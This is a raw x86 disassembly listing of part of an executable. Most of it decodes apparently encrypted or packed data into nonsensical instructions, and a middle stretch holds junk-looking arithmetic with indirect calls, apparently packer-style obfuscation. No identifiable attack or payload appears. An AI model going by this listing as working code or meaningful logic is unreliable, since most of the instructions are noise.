  403391:	fidivr DWORD PTR [ecx-0x102be008]
  403397:	jne    0x4033b0
  403399:	inc    ecx
  40339a:	mov    ah,0xfa
  40339c:	push   ss
  40339d:	sub    BYTE PTR [esi+0x56],cl
  4033a0:	xor    al,0x43
  4033a2:	mov    ecx,?
  4033a4:	jl     0x4033db
  4033a6:	std    
  4033a7:	and    BYTE PTR [ebx-0x2e],ah
  4033aa:	inc    esp
  4033ab:	shr    ecx,1
  4033ad:	adc    BYTE PTR [ebx],cl
  4033af:	xor    bl,BYTE PTR [edx]
  4033b1:	call   0xd555:0x8eadfec0
  4033b8:	test   BYTE PTR [edi+0x35],0x70
  4033bc:	in     eax,0xa7
  4033be:	imul   DWORD PTR es:[ecx-0x7783d9d0]
  4033c5:	aaa    
  4033c6:	leave  
  4033c7:	jmp    0x4e43:0xfe844645
  4033ce:	push   edi
  4033cf:	inc    esi
  4033d0:	sar    esp,1
  4033d2:	pop    ecx
  4033d3:	adc    al,0xb8
  4033d5:	ds jbe 0x403368
  4033d8:	enter  0xd1f0,0xfe
  4033dc:	cmp    eax,0xb4899b6e
  4033e1:	fsubr  DWORD PTR [eax]
  4033e3:	cmp    al,0x59
  4033e5:	jnp    0x403423
  4033e7:	cmp    ecx,DWORD PTR [eax+eiz*1+0x2081892c]
  4033ee:	push   es
  4033ef:	lods   eax,DWORD PTR ds:[esi]
  4033f0:	shr    esi,cl
  4033f2:	arpl   WORD PTR [edx],di
  4033f4:	cmp    al,0x31
  4033f6:	push   ds
  4033f7:	jbe    0x403394
  4033f9:	inc    edi
  4033fa:	dec    eax
  4033fb:	dec    ebx
  4033fc:	retf   
  4033fd:	xchg   esp,eax
  4033fe:	enter  0x8b85,0x88
  403402:	mov    es,WORD PTR [edx]
  403404:	jnp    0x403444
  403406:	cld    
  403407:	or     eax,0xeafeb507
  40340c:	das    
  40340d:	int3   
  40340e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40340f:	jmp    0x4120:0xf92d7ffb
  403416:	mov    al,0x51
  403418:	test   al,bh
  40341a:	scas   al,BYTE PTR es:[edi]
  40341b:	fdiv   QWORD PTR [ebx+0x50]
  40341e:	(bad)  
  40341f:	scas   eax,DWORD PTR es:[edi]
  403420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403421:	jp     0x403476
  403423:	push   esi
  403424:	imul   esi,DWORD PTR [ebx],0x6e91f1de
  40342a:	push   cs
  40342b:	push   esp
  40342c:	xchg   bl,bl
  40342e:	adc    al,0x81
  403430:	or     al,0x20
  403432:	push   esi
  403433:	cmp    dh,BYTE PTR [ecx]
  403435:	inc    edi
  403436:	je     0x403489
  403438:	call   0x8233494c
  40343d:	es pop ebp
  40343f:	xlat   BYTE PTR ds:[ebx]
  403440:	jmp    0xaa9794d
  403445:	shld   DWORD PTR [edi+eax*2-0x4bd3b945],esp,0x99
  40344e:	les    ebp,FWORD PTR [edi-0x42cc4a56]
  403454:	(bad)  [edi-0x4c74552f]
  40345a:	xor    ebx,DWORD PTR [edi-0x45]
  40345d:	out    dx,al
  40345e:	pop    esp
  40345f:	mov    dl,0x90
  403461:	add    DWORD PTR [edx+0x1a],edi
  403464:	cli    
  403465:	dec    ebx
  403466:	jne    0x403482
  403468:	nop
  403469:	in     eax,dx
  40346a:	scas   eax,DWORD PTR es:[edi]
  40346b:	inc    edx
  40346c:	lds    eax,FWORD PTR [eax+0x8214bfc]
  403472:	pop    ss
  403473:	mul    bh
  403475:	loope  0x4034cd
  403477:	das    
  403478:	jle    0x403423
  40347a:	das    
  40347b:	xor    al,0x41
  40347d:	dec    ecx
  40347e:	bound  ebp,QWORD PTR [edx]
  403480:	dec    esp
  403481:	fst    DWORD PTR [eax]
  403483:	loop   0x403435
  403485:	imul   bh
  403487:	(bad)  
  403488:	mov    esp,0x4294b402
  40348d:	mov    esp,ds
  40348f:	mov    WORD PTR ds:0xfa8f2e74,gs
  403495:	inc    ecx
  403496:	stos   DWORD PTR es:[edi],eax
  403497:	ror    DWORD PTR [esp+eiz*8],cl
  40349a:	xor    eax,0x184c0f71
  40349f:	sub    dl,BYTE PTR [edx+eax*2-0xa]
  4034a3:	inc    esp
  4034a4:	aas    
  4034a5:	(bad)  
  4034a6:	sbb    cl,dl
  4034a8:	xor    DWORD PTR [ebx+0x57f519c7],ecx
  4034ae:	or     eax,0x4f58ab50
  4034b3:	pop    edx
  4034b4:	jle    0x4034b5
  4034b6:	jae    0x40349b
  4034b8:	imul   eax,DWORD PTR ds:0x7e0b820d,0xffffffa2
  4034bf:	add    BYTE PTR [ecx+ecx*8+0x24a2e863],dh
  4034c6:	cmc    
  4034c7:	jmp    0x7701cd1e
  4034cc:	aaa    
  4034cd:	sbb    eax,0x344bb234
  4034d2:	mov    dl,0x47
  4034d4:	arpl   WORD PTR [esi+0x79],bp
  4034d7:	sti    
  4034d8:	jae    0x4034bd
  4034da:	xchg   edi,eax
  4034db:	pushf  
  4034dc:	push   esp
  4034dd:	and    BYTE PTR [ecx-0x3d],dh
  4034e0:	jle    0x403555
  4034e2:	or     edi,DWORD PTR [ecx]
  4034e4:	and    DWORD PTR [ebp+eax*1+0x2a],0x1e
  4034e9:	or     BYTE PTR [edx+esi*1+0x76],ah
  4034ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428173,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx-0x7b],ch
  403514:	test   BYTE PTR ds:0x18e5c3be,bh
  40351a:	sbb    BYTE PTR [esi+0x11181812],bl
  403520:	stos   BYTE PTR es:[edi],al
  403521:	sahf   
  403522:	test   dl,0xd7
  403525:	int3   
  403526:	mov    cl,0xa6
  403528:	cdq    
  403529:	aad    0xf4
  40352b:	xor    al,0xd5
  40352d:	dec    ebx
  40352e:	mov    cl,0xc
  403530:	into   
  403531:	sub    DWORD PTR [esi],ebp
  403533:	or     al,0x35
  403535:	mov    ecx,0xc9f6221b
  40353a:	mov    dl,0x79
  40353c:	jmp    0xb52f2125
  403541:	in     al,dx
  403542:	add    BYTE PTR [eax-0x28558e4f],al
  403548:	mov    WORD PTR [ecx+0x16ed03bf],ss
  40354e:	adc    BYTE PTR [ecx],0x41
  403551:	pop    ss
  403552:	push   esi
  403553:	dec    esp
  403554:	inc    ebx
  403555:	mov    ebx,0x1d19a25e
  40355a:	jp     0x403511
  40355c:	and    eax,0xc17ecd94
  403561:	cmp    eax,0x9dcd1fde
  403566:	(bad)  
  403567:	lock lahf 
  403569:	and    DWORD PTR [edi+edx*4-0x6f],esi
  40356d:	sbb    al,0x67
  40356f:	das    
  403570:	call   DWORD PTR [ebx-0x27]
  403573:	mov    ebx,0xe1d44c03
  403579:	sub    eax,0xab086c71
  40357e:	sahf   
  40357f:	call   0x1de1e8b4
  403584:	repz daa 
  403586:	dec    ecx
  403587:	cdq    
  403588:	fcom   st(5)
  40358a:	lods   al,BYTE PTR ds:[esi]
  40358b:	popa   
  40358c:	dec    ebp
  40358d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40358e:	addr16 push edi
  403590:	mov    esi,0x4ac54286
  403595:	cmp    edx,esi
  403597:	retf   0xcd7e
  40359a:	mov    esp,0x8ea6af83
  40359f:	retf   
  4035a0:	arpl   WORD PTR [eax+0x28],bp
  4035a3:	jmp    0xe01d:0xe4cbc51e
  4035aa:	push   ss
  4035ab:	stos   BYTE PTR es:[edi],al
  4035ac:	mov    BYTE PTR [ecx+0x2a6abc1f],al
  4035b2:	ror    BYTE PTR [edx-0x24722e5f],1
  4035b8:	pop    edx
  4035b9:	mov    edx,0x18f78dfd
  4035be:	lds    edx,FWORD PTR [esi-0x18]
  4035c1:	or     esi,DWORD PTR [edi-0x3d44f81c]
  4035c7:	dec    edx
  4035c8:	or     BYTE PTR [edx],ah
  4035ca:	jnp    0x4035e3
  4035cc:	mov    DWORD PTR [esi+0x24],ebp
  4035cf:	mov    eax,0xfb4ad703
  4035d4:	lods   eax,DWORD PTR ds:[esi]
  4035d5:	inc    edx
  4035d6:	adc    al,0x71
  4035d8:	fcomi  st,st(6)
  4035da:	add    edx,ebx
  4035dc:	add    BYTE PTR [esi+0x40a1b5a3],bl
  4035e2:	lock and BYTE PTR [ecx+eiz*1+0x10419a20],al
  4035ea:	pop    es
  4035eb:	xor    DWORD PTR [ebp+0x68],0xf6f40b30
  4035f2:	or     al,0xc2
  4035f4:	scas   al,BYTE PTR es:[edi]
  4035f5:	jle    0x4035d3
  4035f7:	daa    
  4035f8:	add    ah,BYTE PTR [ecx+ecx*4-0x50]
  4035fc:	lock mov cl,0x50
  4035ff:	adc    al,0x4b
  403601:	jo     0x40366b
  403603:	pavgw  mm1,QWORD PTR [eax+0x5a]
  403607:	mov    bh,0x7
  403609:	fimul  DWORD PTR [ecx+0x23]
  40360c:	mov    ch,0xfb
  40360e:	bound  ecx,QWORD PTR [edi+ebp*8+0x7040a94c]
  403615:	jp     0x403645
  403617:	dec    esi
  403618:	jnp    0x403614
  40361a:	jg     0x4035a6
  40361c:	dec    ebx
  40361d:	popa   
  40361e:	dec    ebp
  40361f:	sbb    eax,eax
  403621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403622:	loop   0x40368e
  403624:	jmp    0xb57743d0
  403629:	jbe    0x403621
  40362b:	xor    eax,0xff46d03c
  403630:	sbb    eax,0x3e2be9fb
  403635:	inc    edx
  403636:	not    BYTE PTR [edi-0x25a907f]
  40363c:	fst    DWORD PTR [ebx+0x5a3a2432]
  403642:	or     DWORD PTR [ecx+0x54],edx
  403645:	int3   
  403646:	sub    eax,0x7fe6ca33
  40364b:	add    eax,0x2d111d8
  403650:	outs   dx,BYTE PTR ds:[esi]
  403651:	or     eax,0xeca53b6d
  403656:	push   esp
  403657:	loopne 0x4036b6
  403659:	dec    esp
  40365a:	fdivr  QWORD PTR [ebx-0x64dfee9e]
  403660:	ss xchg edx,eax
  403662:	or     eax,0xa0535365
  403667:	sbb    cl,BYTE PTR [ebp-0x4d]
  40366a:	cmp    al,0x9d
  40366c:	add    cl,cl
  40366e:	fcomi  st,st(6)
  403670:	add    DWORD PTR [ebx+0x62db5ba1],esi
  403676:	sbb    ah,bl
  403678:	hlt    
  403679:	in     eax,dx
  40367a:	xchg   DWORD PTR [edx],ecx
  40367c:	jmp    0x403676
  40367e:	daa    
  40367f:	and    dh,bl
  403681:	inc    esi
  403682:	popa   
  403683:	(bad)  
  403684:	sub    DWORD PTR [esi-0x61],ebp
  403687:	(bad)  [ebx]
  403689:	and    DWORD PTR [ecx+edx*2-0x477f22bf],esp
  403690:	enter  0xd04b,0x88
  403694:	adc    ch,BYTE PTR [esi+0x71]
  403697:	or     eax,0x13a2cc9a
  40369c:	jle    0x4036f8
  40369e:	or     al,0x2e
  4036a0:	mov    ch,0x67
  4036a2:	jne    0x403635
  4036a4:	cmp    BYTE PTR [edi+esi*4+0x1c],0xb3
  4036a9:	pushf  
  4036aa:	loop   0x403681
  4036ac:	dec    esp
  4036ad:	cmp    eax,0x4cf55bd4
  4036b2:	adc    DWORD PTR [ebx+0x138b556b],0xffffffbd
  4036b9:	xchg   ebx,eax
  4036ba:	fadd   st(6),st
  4036bc:	pop    edi
  4036bd:	shl    BYTE PTR [edi-0x4995f224],cl
  4036c3:	(bad)  
  4036c5:	int    0x43
  4036c7:	aam    0x19
  4036c9:	mov    ebp,0x6070cfaa
  4036ce:	ss adc dh,ch
  4036d1:	lock cmp al,0xaa
  4036d4:	jne    0x4036dc
  4036d6:	shl    esp,0x40
  4036d9:	icebp  
  4036da:	jno    0x403718
  4036dc:	ret    
  4036dd:	mov    bl,0xee
  4036df:	std    
  4036e0:	scas   al,BYTE PTR es:[edi]
  4036e1:	(bad)  
  4036e2:	sti    
  4036e3:	pop    eax
  4036e4:	sub    eax,0x61cde55
  4036e9:	sti    
  4036ea:	fnstenv [edi+0x26128922]
  4036f0:	lds    eax,FWORD PTR [esp+ecx*8-0x56f731f1]
  4036f7:	scas   eax,DWORD PTR es:[edi]
  4036f8:	and    bh,ch
  4036fa:	cmp    dl,dh
  4036fc:	in     eax,0xdc
  4036fe:	hlt    
  4036ff:	sar    al,0x95
  403702:	mov    esi,0xa44b566e
  403707:	pop    es
  403708:	in     al,0x3f
  40370a:	fcom   DWORD PTR [eax+eiz*2+0x55]
  40370e:	dec    ecx
  40370f:	mov    edx,0x7c65d527
  403714:	(bad)  
  403715:	cli    
  403716:	cmp    eax,0xcec12d63
  40371b:	iret   
  40371c:	xor    eax,0x13ffc0fb
  403721:	std    
  403722:	cli    
  403723:	sahf   
  403724:	data16 sub al,0x32
  403727:	nop
  403728:	aas    
  403729:	mov    ds,WORD PTR [edx+0x60316fec]
  40372f:	lods   ax,WORD PTR ds:[esi]
  403731:	idiv   BYTE PTR [edi+ebx*1-0x26]
  403735:	ins    BYTE PTR es:[edi],dx
  403736:	stc    
  403737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403738:	mov    bh,0x13
  40373a:	inc    esp
  40373b:	es jl  0x40372a
  40373e:	xchg   ebx,eax
  40373f:	loop   0x4037b3
  403741:	loopne 0x403736
  403743:	cld    
  403744:	stos   DWORD PTR es:[edi],eax
  403745:	pop    edx
  403746:	and    ch,BYTE PTR [edi-0x7]
  403749:	repnz adc eax,0x99107c6e
  40374f:	cmp    eax,0xa44a9374
  403754:	in     al,0x72
  403756:	jb     0x403788
  403758:	sahf   
  403759:	rcr    ah,0x8e
  40375c:	push   ebx
  40375d:	loop   0x4036f0
  40375f:	dec    edx
  403760:	sbb    BYTE PTR [eax-0x2497e4e9],bl
  403766:	(bad)  
  403767:	sub    eax,0xafe265a7
  40376c:	inc    ebp
  40376d:	mov    dl,0x70
  40376f:	jmp    0x1304:0x2aca29b8
  403776:	push   ebp
  403777:	aas    
  403778:	or     eax,DWORD PTR [ecx-0x1057a51]
  40377e:	pop    edx
  40377f:	daa    
  403780:	adc    DWORD PTR [eax+0x18],ecx
  403783:	sub    eax,0x328b6e09
  403788:	push   cs
  403789:	lods   al,BYTE PTR ds:[esi]
  40378a:	test   DWORD PTR [edi+eax*4+0x3ba55017],ecx
  403791:	in     al,0x4a
  403793:	cmp    eax,0xb7693388
  403798:	ror    esi,0xec
  40379b:	sub    DWORD PTR [ecx-0x455bf8de],esi
  4037a1:	fisttp DWORD PTR [edi-0x151078ad]
  4037a7:	leave  
  4037a8:	cs iret 
  4037aa:	jo     0x4037b4
  4037ac:	jecxz  0x4037c4
  4037ae:	in     eax,0x1b
  4037b0:	popf   
  4037b1:	xor    esi,edx
  4037b3:	and    BYTE PTR [edi+0xeab1b34],bl
  4037b9:	or     cl,BYTE PTR [eax+0x3b37c39d]
  4037bf:	adc    ah,BYTE PTR [ecx+0x6ed91d8e]
  4037c5:	or     eax,0x2f2bc645
  4037ca:	test   al,0xd8
  4037cc:	push   DWORD PTR ds:0x279ba4fc
  4037d2:	mov    ebp,0x29f32600
  4037d7:	sbb    al,0xfd
  4037d9:	cmc    
  4037da:	sbb    BYTE PTR [esi],dh
  4037dc:	retf   
  4037dd:	test   dh,cl
  4037df:	scas   al,BYTE PTR es:[edi]
  4037e0:	stc    
  4037e1:	sbb    DWORD PTR [esi-0x70c1b902],esp
  4037e7:	xchg   edx,eax
  4037e8:	push   edx
  4037e9:	mov    ch,0xf6
  4037eb:	and    dh,BYTE PTR [esi]
  4037ed:	mov    DWORD PTR [edx],esi
  4037ef:	cmp    dl,BYTE PTR [eax-0xcf5cff7]
  4037f5:	add    al,0xaa
  4037f7:	(bad)  
  4037f8:	mov    ds,WORD PTR [ebp+0x31]
  4037fb:	(bad)  [ecx-0x47]
  4037fe:	shl    esi,cl
  403800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403801:	jge    0x4037a9
  403803:	dec    esp
  403804:	(bad)  
  403806:	jno    0x4037e7
  403808:	sub    eax,0xef99032f
  40380d:	xor    eax,0xde09cbfd
  403812:	test   al,0x70
  403814:	xor    cl,ah
  403816:	or     bh,ah
  403818:	xor    eax,0xcbf3b7eb
  40381d:	push   ecx
  40381e:	sbb    BYTE PTR [esi+0x154c4b37],ch
  403824:	cld    
  403825:	nop
  403826:	retf   
  403827:	add    esi,0xffffffbd
  40382a:	cmp    eax,0x15763f99
  40382f:	aaa    
  403830:	arpl   WORD PTR [esi+0x1d],ax
  403833:	push   edx
  403834:	test   eax,0xc34e2f62
  403839:	adc    DWORD PTR ds:0xb452e8bc,esi
  40383f:	adc    ebx,DWORD PTR [edx]
  403841:	push   esp
  403842:	data16 cmp bl,BYTE PTR cs:[edx-0x289774ae]
  40384a:	xchg   ecx,eax
  40384b:	pushf  
  40384c:	int3   
  40384d:	mov    ah,0x31
  40384f:	sbb    bl,BYTE PTR [eax+0x2]
  403852:	push   ebp
  403853:	xchg   edx,eax
  403854:	mov    BYTE PTR [edx+edi*2],bh
  403857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403858:	je     0x403864
  40385a:	inc    ebx
  40385b:	mov    edi,0x338a98a2
  403860:	ror    DWORD PTR [esi-0x67],cl
  403863:	adc    al,0x10
  403865:	out    0x79,al
  403867:	cmp    edx,DWORD PTR [esi-0x13de4ac8]
  40386d:	dec    edi
  40386e:	mov    dl,0xcf
  403870:	mov    ebx,ebx
  403872:	out    dx,al
  403873:	push   ds
  403874:	push   eax
  403875:	adc    BYTE PTR [bx+di+0x62c5],dl
  40387a:	add    al,0x76
  40387c:	ror    DWORD PTR [ecx+0x75],0x40
  403880:	fstp   TBYTE PTR [edi]
  403882:	xchg   ebx,eax
  403883:	add    bl,BYTE PTR [esi-0x3550311d]
  403889:	fneni(8087 only) 
  40388b:	mov    dl,0xdc
  40388d:	push   eax
  40388e:	and    DWORD PTR [esi],0x94144536
  403894:	dec    esi
  403895:	mov    ah,0xc7
  403897:	cdq    
  403898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403899:	dec    ebp
  40389a:	lock mov BYTE PTR [edi+0x72708f5a],ah
  4038a1:	jno    0x403849
  4038a3:	mov    ah,0x2c
  4038a5:	je     0x403905
  4038a7:	test   BYTE PTR [edi+eiz*4],bh
  4038aa:	rcl    BYTE PTR ds:0x57f8180,1
  4038b0:	sbb    edi,DWORD PTR [ecx+eax*1]
  4038b3:	test   edi,edi
  4038b5:	mov    dl,0x2b
  4038b7:	add    ecx,ebx
  4038b9:	sar    DWORD PTR [ecx],0x8
  4038bc:	mov    bl,ah
  4038be:	inc    edi
  4038bf:	ins    DWORD PTR es:[edi],dx
  4038c0:	popf   
  4038c1:	mov    bh,0xcd
  4038c3:	pop    ecx
  4038c4:	leave  
  4038c5:	aaa    
  4038c6:	mov    al,0x26
  4038c8:	sti    
  4038c9:	pop    ss
  4038ca:	dec    eax
  4038cb:	and    eax,0x2de956cb
  4038d0:	dec    esi
  4038d1:	and    BYTE PTR [eax],cl
  4038d3:	jle    0x403933
  4038d5:	in     eax,dx
  4038d6:	call   0x4187db87
  4038db:	add    ah,bh
  4038dd:	mov    edx,0x458b96d9
  4038e2:	hlt    
  4038e3:	cmp    DWORD PTR ds:0x428273,0x0
  4038ea:	not    DWORD PTR ds:0x42816b
  4038f0:	mov    ecx,DWORD PTR ds:0x428297
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428273,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428ee8
  403913:	xor    edx,DWORD PTR ds:0x42825f
  403919:	neg    DWORD PTR ds:0x428273
  40391f:	xor    DWORD PTR ds:0x428167,0x12a5
  403929:	and    DWORD PTR ds:0x4283b7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42829b
  403939:	or     ecx,DWORD PTR ds:0x42824f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428173,0x0
  403949:	mov    DWORD PTR ds:0x4283b7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428173,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dbc
  40397f:	adc    DWORD PTR ds:0x4282a7,0x42818f
  403989:	sbb    DWORD PTR ds:0x428293,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428393
  403999:	or     DWORD PTR ds:0x42826f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428297
  4039a7:	adc    edx,DWORD PTR ds:0x42827b
  4039ad:	mov    DWORD PTR ds:0x428297,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42824f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282b7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x4282ab,0x4283b7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42818b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428167,0x42832f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428173,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42816b,0x428303
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42827f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428297,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428167,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428293,0x0
  403a3e:	mov    DWORD PTR ds:0x42831f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283b7
  403a57:	cmp    DWORD PTR ds:0x428293,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d98
  403a6f:	mov    edx,DWORD PTR ds:0x42834f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283e3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428193,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428187,0x2089
  403aa2:	or     DWORD PTR ds:0x42816b,0x113b
  403aac:	mov    eax,ds:0x4223e0
  403ab1:	cmp    DWORD PTR ds:0x428193,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42825f
  403ac3:	mov    DWORD PTR ds:0x428243,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428333,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428193,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428193,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428133
  403af8:	call   DWORD PTR ds:0x428dc0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42825b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42829f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42838b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42817b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x7c874d01
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi-0x21e7e7ee],bl
  403b4b:	adc    bl,dl
  403b4d:	(bad)  
  403b4f:	in     eax,0xfb
  403b51:	test   eax,0xfd7f50b0
  403b56:	ins    DWORD PTR es:[edi],dx
  403b57:	repnz cmp BYTE PTR [ebp+0x62],bl
  403b5b:	pop    edi
  403b5c:	int    0x60
  403b5e:	mov    ebp,0x7629a8d3
  403b63:	mov    DWORD PTR [edx+edi*8+0x7d2db29],esi
  403b6a:	adc    BYTE PTR [ebx],ch
  403b6c:	rcl    esi,cl
  403b6e:	int3   
  403b6f:	push   es
  403b70:	not    BYTE PTR [edx-0x2d34b2f3]
  403b76:	loope  0x403b49
  403b78:	cli    
  403b79:	adc    esp,DWORD PTR [ecx+edx*8-0x7dc4c165]
  403b80:	push   esi
  403b81:	sub    al,0xc
  403b83:	cld    
  403b84:	xor    al,0xd5
  403b86:	and    ch,cl
  403b88:	jnp    0x403b79
  403b8a:	inc    ecx
  403b8b:	pop    esi
  403b8c:	scas   al,BYTE PTR es:[edi]
  403b8d:	inc    ebx
  403b8e:	push   ebp
  403b8f:	int3   
  403b90:	xor    al,0x8e
  403b92:	pop    edi
  403b93:	data16 and dh,BYTE PTR [ebx]
  403b96:	xor    DWORD PTR [ebx],esi
  403b98:	sbb    al,0x6
  403b9a:	cmc    
  403b9b:	cmp    BYTE PTR [ebp-0x2b],0xad
  403b9f:	adc    al,0x41
  403ba1:	jmp    0x403bbe
  403ba3:	or     al,0x5f
  403ba5:	lods   al,BYTE PTR ds:[esi]
  403ba6:	fldcw  WORD PTR [edx+edi*4]
  403ba9:	mov    ds:0x47c2220d,al
  403bae:	jmp    0x375521f1
  403bb3:	xchg   dl,ch
  403bb5:	push   edi
  403bb6:	pop    edx
  403bb7:	push   ss
  403bb8:	mov    esi,0xea95f876
  403bbd:	(bad)  
  403bbe:	lea    esp,gs:[edx*8+0x729e4073]
  403bc6:	imul   ebx,DWORD PTR [esi+0x2b864750],0x7a9f66a6
  403bd0:	sahf   
  403bd1:	inc    edi
  403bd2:	into   
  403bd3:	and    DWORD PTR [esi+0x2f],0xffffff93
  403bd7:	dec    eax
  403bd8:	xor    DWORD PTR [eax-0x3d2004e],edi
  403bde:	das    
  403bdf:	mov    dl,BYTE PTR [edi+0x4b]
  403be2:	into   
  403be3:	or     cl,dh
  403be5:	dec    edx
  403be6:	push   eax
  403be7:	ficomp DWORD PTR [ebx+0x661f1a18]
  403bed:	add    BYTE PTR [ebx+ebp*8],ch
  403bf0:	xchg   edx,eax
  403bf1:	and    dl,BYTE PTR [edi+0x67cac7c0]
  403bf7:	adc    eax,0xb7da9f8c
  403bfc:	aam    0xef
  403bfe:	and    edx,ebp
  403c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c01:	outs   dx,DWORD PTR ds:[esi]
  403c02:	loop   0x403bdc
  403c04:	out    dx,al
  403c05:	sbb    al,BYTE PTR ds:[ecx]
  403c08:	jg     0x403bc3
  403c0a:	inc    eax
  403c0b:	in     al,0xb
  403c0d:	fptan  
  403c0f:	jmp    0xcb951b74
  403c14:	dec    ecx
  403c15:	loope  0x403c54
  403c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c18:	aad    0x2a
  403c1a:	pop    es
  403c1b:	inc    esi
  403c1c:	cmc    
  403c1d:	inc    ecx
  403c1e:	adc    BYTE PTR [ecx+0x244825b7],dh
  403c24:	jmp    0x60e686c2
  403c29:	push   edi
  403c2a:	(bad)  
  403c2b:	mov    bh,0xb8
  403c2d:	ret    0xe449
  403c30:	adc    al,0x74
  403c32:	cmp    BYTE PTR ds:0x85d19bcf,dh
  403c38:	push   esp
  403c39:	mov    ebp,0x49b499a4
  403c3e:	adc    ebp,DWORD PTR [edi-0x190a43d0]
  403c44:	(bad)  
  403c45:	pushf  
  403c46:	inc    ebp
  403c47:	pushf  
  403c48:	pop    es
  403c49:	mov    dh,0xb4
  403c4b:	in     eax,dx
  403c4c:	and    eax,0xddab9bf6
  403c51:	stos   BYTE PTR es:[edi],al
  403c52:	jl     0x403cb6
  403c54:	sbb    al,0x9d
  403c56:	pop    ebx
  403c57:	in     eax,dx
  403c58:	jmp    0x5f4557f1
  403c5d:	push   edi
  403c5e:	(bad)  
  403c5f:	fs cmp al,cl
  403c62:	shr    DWORD PTR [esp+eiz*4],0x9b
  403c66:	adc    eax,0x3cc9649b
  403c6b:	test   edi,ecx
  403c6d:	pop    esp
  403c6e:	in     al,0x24
  403c70:	scas   al,BYTE PTR es:[edi]
  403c71:	sub    ecx,edx
  403c73:	and    ecx,DWORD PTR [edx-0x7f23f0b7]
  403c79:	fcom   QWORD PTR [edx]
  403c7b:	xchg   edi,eax
  403c7c:	jg     0x403c6e
  403c7e:	jbe    0x403cc5
  403c80:	iret   
  403c81:	xchg   DWORD PTR [eax],esi
  403c83:	xor    dl,BYTE PTR [ebp-0x1af05cc9]
  403c89:	fild   QWORD PTR [eax+0x74]
  403c8c:	int    0x9b
  403c8e:	sbb    esp,DWORD PTR [eax+edi*2+0x1588489b]
  403c95:	adc    eax,0xd59bbca5
  403c9a:	pop    edi
  403c9b:	xchg   esi,eax
  403c9c:	and    DWORD PTR [eax-0x2be8482e],ebx
  403ca2:	xchg   edx,eax
